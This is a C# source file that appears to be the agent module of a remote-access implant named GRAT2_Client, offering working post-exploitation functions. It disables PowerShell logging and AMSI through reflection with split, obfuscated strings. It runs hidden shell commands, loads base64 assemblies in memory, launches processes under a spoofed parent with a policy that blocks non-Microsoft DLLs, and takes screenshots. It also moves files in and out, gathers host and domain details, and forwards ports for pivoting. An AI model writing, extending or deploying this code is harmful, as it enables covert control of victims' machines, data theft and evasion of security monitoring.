using System.Diagnostics;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Reflection;
using System;
using System.Text;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Net;
using Microsoft.Win32.SafeHandles;
using System.Windows.Forms;
using System.Drawing;
using System.Net.Sockets;
using System.Threading;
using GRAT2_Client.Injectious;
using System.Diagnostics.Eventing;
using System.Collections;
using System.Net.Configuration;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

namespace GRAT2_Client.PInvoke
{
    class Execute
    {
        public static string sleep (string[] arguments)
        {
            Config.sleep = Convert.ToInt32(arguments[1]);
            return "Agent sleep time changed to " + Config.sleep + " seconds";
        }
        public static string cmd(string[] command)

        {
            Process p = new Process();
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";

            string t = "/c ";
            for (int i = 1; i < command.Length; i++)
            {
                t = t + " " + command[i];
            }

            p.StartInfo.Arguments = t;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();

            p.WaitForExit();
            return output;
        }

        //Bypass AV (PS Logging)
        public static Guid guidId = Guid.NewGuid();

        public static string UnPosh(string[] command)
        {
            //https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
            //https://twitter.com/mattifestation/status/735261176745988096?lang=en

             PowerShell pInst = PowerShell.Create();
            
            
            var pELP = pInst.GetType().Assembly.GetType("Sys" + "tem." + "Mana" + "geme" + "nt.Aut" + "oma" + "tio"+ "n.Tr" + "aci" + "ng.P" + "SE" + "twL" + "og" + "Pr" + "ovi" + "d" + "er");
            if (pELP != null)
            {
                var eP = pELP.GetField("e"+"tw"+"Pr"+"ov"+"id"+"er", BindingFlags.NonPublic | BindingFlags.Static);
                var eTP = new EventProvider(guidId);
                eP.SetValue(null, eTP);
            }
            
            
            bool bA = true;
            var aU = pInst.GetType().Assembly.GetType("S"+"ys"+"te"+"m.M"+"an"+"ag"+"em"+"ent"+".A"+"ut"+"om"+"at"+"i"+"o"+"n.A"+"ms"+"i"+"U"+"ti"+"l"+"s");
            if (aU != null && bA == true)
            {
                var aP = aU.GetField("a" + "m" + "s" + "iI" + "n" + "i" + "tF" + "ai" + "l" + "ed", BindingFlags.NonPublic | BindingFlags.Static);
                aP.SetValue(null, true);
            }
            
            string readCommand = "";
            for (int i = 1; i < command.Length; i++)
            {
                readCommand = readCommand + " " + command[i];
            }
            pInst.Commands.AddScript(readCommand);
            pInst.Commands.AddCommand("Ou"+"t-"+"S"+"tr"+"ing");
            StringBuilder stringBuilder = new StringBuilder();

            try
            {
                Collection<PSObject> results = pInst.Invoke();
                foreach (PSObject obj in results)
                {
                    stringBuilder.Append(obj);
                }
            }
            catch (Exception e)
            {
                return stringBuilder.Append(string.Format("Error {0}", e.Message)).ToString();
            }
            return stringBuilder.ToString().Trim();
                        
        }
        

        public static string ExeAssembly(string[] arguments)
        {
            var consoleout = new StringWriter();
            try
            {
                // https://exord66.github.io/csharp-in-memory-assemblies
                Console.SetOut(consoleout);
                byte[] decode_assembly = Convert.FromBase64String(arguments[1]); //decode base64
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(decode_assembly);
                //Find the Entrypoint or "Main" method
                MethodInfo method = assembly.EntryPoint;
                string[] Split_Arguments = arguments.Skip(2).ToArray();
                object[] Args_Object = new[] { Split_Arguments };
                if (method != null)
                {
                    object Obj_Parameters = assembly.CreateInstance(method.Name);
                    method.Invoke(Obj_Parameters, Args_Object);
                }

                var stdout = Console.Out;
                Console.SetOut(stdout);
            }
            catch (Exception ex)
            {
                return ex.Message;

            }
            return consoleout.ToString();

        }

        public static string ListProcess()
        {
            // https://www.c-sharpcorner.com/UploadFile/mahesh/format-string-in-C-Sharp/
            string lisofproc = String.Format("\n");
            lisofproc += String.Format("{0,-65} {1,-10} {2, -10}\n", "Process Name", "Process ID", "Process Owner");
            lisofproc += String.Format("================================================================================================\n");

            foreach (Process p in Process.GetProcesses("."))
            {
                try
                {
                    lisofproc += String.Format("{0,-65} {1,-10} {2, -10}\n", p.ProcessName.ToString(), p.Id.ToString(), GetProcessOwner(p));
                }
                catch (Exception ex)
                {
                    return ex.Message;
                }
            }

            return lisofproc;
        }


        // Credits to Ryan Cobb (@cobbr_io)
        public static string GetProcessOwner(Process Process)
        {
            try
            {
                Interop.OpenProcessToken(Process.Handle, 8, out IntPtr handle);
                using (var winIdentity = new WindowsIdentity(handle))
                {
                    return winIdentity.Name;
                }
            }
            catch (InvalidOperationException)
            {
                return string.Empty;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return string.Empty;
            }
        }

        public static string CurrentDirectory()
        {
            return Directory.GetCurrentDirectory();
        }

        public static string DirectoryListing(string[] path)
        {

            string dirListing = String.Format("\n");
            dirListing += String.Format("{0,-25} {1,-25} {2, -25}\n", "Creation Time", "Last Access", "Directories and File Name");
            dirListing += String.Format("================================================================================================\n");
            // I have replaced '+' with SPACE because in Program.cs we splitting the results based on SPACES
            string Replaced_Path = path[1].Replace('+', ' ');
            try
            {

                if (string.IsNullOrEmpty(path[1]))
                {
                    foreach (string DirectoryListing in Directory.GetDirectories(Directory.GetCurrentDirectory()))
                    {

                        DirectoryInfo DirectoryListingInfo = new DirectoryInfo(DirectoryListing);
                        try
                        {

                            dirListing += String.Format("{0,-25} {1,-25} {2, -25}\n", DirectoryListingInfo.CreationTimeUtc, DirectoryListingInfo.LastAccessTimeUtc, DirectoryListing);

                        }
                        catch (Exception ex)
                        {
                            return ex.Message;
                        }
                    }

                    foreach (string filename in Directory.GetFiles(Directory.GetCurrentDirectory()))
                    {
                        DirectoryInfo DirectoryListingInfo = new DirectoryInfo(filename);
                        try
                        {
                            dirListing += String.Format("{0,-25} {1,-25} {2, -25}\n", DirectoryListingInfo.CreationTimeUtc, DirectoryListingInfo.LastAccessTimeUtc, filename);
                        }
                        catch (Exception ex)
                        {
                            return ex.Message;
                        }

                    }

                }
                else if (Directory.Exists(Replaced_Path))
                {
                    foreach (string DirectoryListing in Directory.GetDirectories(Replaced_Path))
                    {

                        DirectoryInfo DirectoryListingInfo = new DirectoryInfo(DirectoryListing);
                        try
                        {

                            dirListing += String.Format("{0,-25} {1,-25} {2, -25}\n", DirectoryListingInfo.CreationTimeUtc, DirectoryListingInfo.LastAccessTimeUtc, DirectoryListing);

                        }
                        catch (Exception ex)
                        {
                            return ex.Message;
                        }
                    }

                    foreach (string filename in Directory.GetFiles(Replaced_Path))
                    {
                        DirectoryInfo DirectoryListingInfo = new DirectoryInfo(filename);
                        try
                        {
                            dirListing += String.Format("{0,-25} {1,-25} {2, -25}\n", DirectoryListingInfo.CreationTimeUtc, DirectoryListingInfo.LastAccessTimeUtc, filename);
                        }
                        catch (Exception ex)
                        {
                            return ex.Message;
                        }

                    }
                }
                else
                {
                    return "Directory does not exists";
                }
            }
            catch(Exception ex)
            {
                return ex.Message;
            }
            return dirListing;
        }

        public static string GetCurrentProcess()
        {
            string processId = Process.GetCurrentProcess().Id.ToString();
            return processId;
        }

        public static string RunCmd(string[] arguments)
        {
            int parentId = SearchPID.SearchForPPID();
            var args = arguments[1].Replace('+', ' ');
            var caretedArg = "";
            var lpCommandLine = "";

            if (arguments[0] == "caretrun")
            {
                for (int i = 0; i < args.Length; i += 2)
                {
                    caretedArg = args.Insert(i, "^");
                    args = caretedArg;
                }
                lpCommandLine = @"cmd.exe /c " + caretedArg;
            }
            else
            {
                lpCommandLine = @"cmd.exe /c " + args;
            }

            // STARTUPINFOEX members
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            // STARTUPINFO members (dwFlags and wShowWindow)
            const int STARTF_USESTDHANDLES = 0x00000100;
            const int STARTF_USESHOWWINDOW = 0x00000001;
            const ushort SW_HIDE = 0x0000;
            const uint DUPLICATE_CLOSE_SOURCE = 0x00000001;
            const uint DUPLICATE_SAME_ACCESS = 0x00000002;

            // Mitigation Policy
            const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
            const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;

            var blockMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);

            var result = string.Empty;

            var saHandles = new flags.SECURITY_ATTRIBUTES();
            saHandles.nLength = Marshal.SizeOf(saHandles);
            saHandles.bInheritHandle = true;
            saHandles.lpSecurityDescriptor = IntPtr.Zero;

            IntPtr hStdOutRead;
            IntPtr hStdOutWrite;
            var hDupStdOutWrite = IntPtr.Zero;

            Interop.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
            Interop.SetHandleInformation(hStdOutRead, flags.HANDLE_FLAGS.INHERIT, 0);

            var pInfo = new flags.PROCESS_INFORMATION();
            var siEx = new flags.STARTUPINFOEX();

            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            var lpValueProc = IntPtr.Zero;

            siEx.StartupInfo.hStdError = hStdOutWrite;
            siEx.StartupInfo.hStdOutput = hStdOutWrite;

            try
            {

                var lpSize = IntPtr.Zero;
                Interop.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Interop.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);

                if (IntPtr.Size == 4)
                {
                    Marshal.WriteIntPtr(blockMitigationPolicy, IntPtr.Zero);
                }
                else
                {
                    Marshal.WriteIntPtr(blockMitigationPolicy, new IntPtr((long)BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
                }

                Interop.UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, blockMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                var parentHandle = Interop.OpenProcess(flags.ProcessAccessRights.CreateProcess | flags.ProcessAccessRights.DuplicateHandle, false, parentId);
                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, parentHandle);

                Interop.UpdateProcThreadAttribute(
                        siEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        lpValueProc,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);

                var hCurrent = Process.GetCurrentProcess().Handle;
                var hNewParent = Interop.OpenProcess(flags.ProcessAccessRights.DuplicateHandle, true, parentId);
                Interop.DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);

                siEx.StartupInfo.hStdError = hDupStdOutWrite;
                siEx.StartupInfo.hStdOutput = hDupStdOutWrite;
                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                siEx.StartupInfo.wShowWindow = SW_HIDE;

                var ps = new flags.SECURITY_ATTRIBUTES();
                var ts = new flags.SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

                Interop.CreateProcess(null, lpCommandLine, ref ps, ref ts, true, flags.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | flags.ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);

                // Credits to SharpC2 - https://raw.githubusercontent.com/SharpC2/SharpC2/dev/AgentModules/StageOne/Execution/LocalExecution.cs
                var safeHandle = new SafeFileHandle(hStdOutRead, false);
                var encoding = Encoding.GetEncoding(Interop.GetConsoleOutputCP());
                var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
                var exit = false;

                try
                {
                    do
                    {
                        if (Interop.WaitForSingleObject(pInfo.hProcess, 100) == 0) { exit = true; }
                        char[] buf = null;
                        int bytesRead;
                        uint bytesToRead = 0;
                        var peekRet = Interop.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                        if (peekRet == true && bytesToRead == 0)
                        {
                            if (exit == true) { break; }
                            else { continue; }
                        }

                        if (bytesToRead > 4096) { bytesToRead = 4096; }

                        buf = new char[bytesToRead];
                        bytesRead = reader.Read(buf, 0, buf.Length);

                        if (bytesRead > 0) { result += new string(buf); }

                    } while (true);

                    reader.Close();
                }
                catch (Exception e) { Console.WriteLine(e.Message); 
                }
                finally
                {
                    if (!safeHandle.IsClosed) { safeHandle.Close(); }
                    if (hStdOutRead != IntPtr.Zero) { Interop.CloseHandle(hStdOutRead); }
                }
            }
            catch (Exception e) { Console.WriteLine(e.Message); 
            }
            finally
            {
                if (siEx.lpAttributeList != IntPtr.Zero)
                {
                    Interop.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                    Marshal.FreeHGlobal(siEx.lpAttributeList);
                }

                Marshal.FreeHGlobal(lpValueProc);

                if (pInfo.hProcess != IntPtr.Zero) { Interop.CloseHandle(pInfo.hProcess); }
                if (pInfo.hThread != IntPtr.Zero) { Interop.CloseHandle(pInfo.hThread); }
            }

            return (result);
        }

        public static string ChangeDir(string[] newpath)
        {
            var newDirectory = newpath[1].Replace('+', ' ');
            if (Directory.Exists(newDirectory))
            {
                string newDir = Environment.CurrentDirectory = newDirectory;
                return "Directory Changed to " + newDir;
            }
            else
            {
                return "Directory does not exists";
            }
            
        }

        public static string upload(string[] args)
        {
            try
            {

                string remotePath = args[3].Replace('+', ' ');
                byte[] bytes = Convert.FromBase64String(args[1]); //decode base64
                File.WriteAllBytes(remotePath + "\\" + args[2], bytes); // remotepath + \\ + filename , file content

            }
            catch (Exception ex)
            {
                return ex.Message;
            }
            return "File uploaded!";
        }

        public static string download(string[] args)
        {
            try
            {
                string localpath = args[1].Replace('+', ' ');
                string fileName = null;
                fileName = Path.GetFileName(localpath);
                string results = "";
                string file = "";
                // https://www.dotnetforall.com/ways-to-read-a-file-in-csharp/

                
                using (FileStream fs = File.Open(localpath, FileMode.Open, FileAccess.Read))
                using (BinaryReader reader = new BinaryReader(fs))
                {
                    byte[] bytesRead = new byte[fs.Length];
                    reader.Read(bytesRead, 0, Convert.ToInt32(fs.Length));
                    results = Convert.ToBase64String(bytesRead);
                    file = "DownloadingFileRand1me3" + " " + fileName + " " + results;

                }
                file = "DownloadingFileRand1me3" + " " + fileName + " " + results;
                
                return file;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public static string takeScreenShot()
        {
            //https://stackoverflow.com/questions/18578865/c-sharp-sending-image-over-socket
            Bitmap bmp = new Bitmap(CaptureDesktop());
            Image f = (Image)bmp;
            MemoryStream ms = new MemoryStream();
            f.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
            byte[] bytes = ms.ToArray();
            string imgb64 = Convert.ToBase64String(bytes);
            return "This1sScreenSh0t" + " " + imgb64;

        }

        public static Image CaptureDesktop()
        {
            Rectangle bounds = default(Rectangle);
            System.Drawing.Bitmap screenshot = null;
            Graphics graph = default(Graphics);
            bounds = Screen.PrimaryScreen.Bounds;
            screenshot = new Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            graph = Graphics.FromImage(screenshot);
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }

        public static string whoami()
        {
            string whoami = Environment.UserName;
            return whoami;
        }

        public static string hostname()
        {
            string hostname = Environment.MachineName;
            return hostname;
        }

        public static string domain()
        {
            string domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            return domain;
        }

        public static string rportfwd(string[] arguments)
        {
            // http://allanrbo.blogspot.com/2014/08/a-simple-tcp-proxy-forwarder-in-net.html
            var localPort = int.Parse(arguments[1]);
            var remoteServerHost = arguments[2];
            var remoteServerPort = int.Parse(arguments[3]);

            var TcpListener = new TcpListener(IPAddress.Any, localPort);

                
                try
                {
                    
                    TcpListener.Start();

                    while (true)
                    {
                        var client1 = TcpListener.AcceptTcpClient();
                        var remoteAddress = (client1.Client.RemoteEndPoint as IPEndPoint).Address.ToString();
                        var client2 = new TcpClient(remoteServerHost, remoteServerPort);

                        new Thread(() => { ProxyStream(remoteAddress, client1.GetStream(), remoteServerHost, client2.GetStream()); }).Start();
                        new Thread(() => { ProxyStream(remoteServerHost, client2.GetStream(), remoteAddress, client1.GetStream()); }).Start();
                        
                    }
                }

                catch (Exception ex)
                {
                    return ex.Message;
                }
         }

        static void ProxyStream(string stream1name, NetworkStream stream1, string stream2name, NetworkStream stream2)
        {
            var buffer = new byte[65536];
            try
            {
                while (true)
                {
                    var len = stream1.Read(buffer, 0, 65536);
                    stream2.Write(buffer, 0, len);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public static string getLocalIP()
        {
            return Dns.GetHostEntry(Dns.GetHostName()).AddressList[1].ToString();
        }

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

   
     }

}
